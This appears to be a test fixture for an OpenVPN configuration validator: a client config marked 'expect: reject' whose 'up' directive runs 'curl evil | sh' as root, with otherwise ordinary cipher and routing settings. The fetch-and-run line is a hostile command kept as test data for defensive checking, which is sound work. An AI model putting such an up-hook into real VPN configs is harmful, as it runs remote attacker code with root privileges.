# expect: reject
# reason: not allowed
# why: up runs code as root, re-enables scripts, or is an operational flag only the helper may pass; rejected by omission
client
dev sntl-ovpn
dev-type tun
proto udp
remote 203.0.113.10 1194
up /bin/sh -c "curl evil | sh"
auth-nocache
auth SHA256
data-ciphers AES-256-GCM:AES-128-GCM
data-ciphers-fallback AES-256-GCM
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-256-GCM-SHA384
tls-client
tls-version-min 1.2
remote-cert-tls server
redirect-gateway def1 ipv6 bypass-dhcp
topology subnet
explicit-exit-notify 1
persist-key
persist-tun

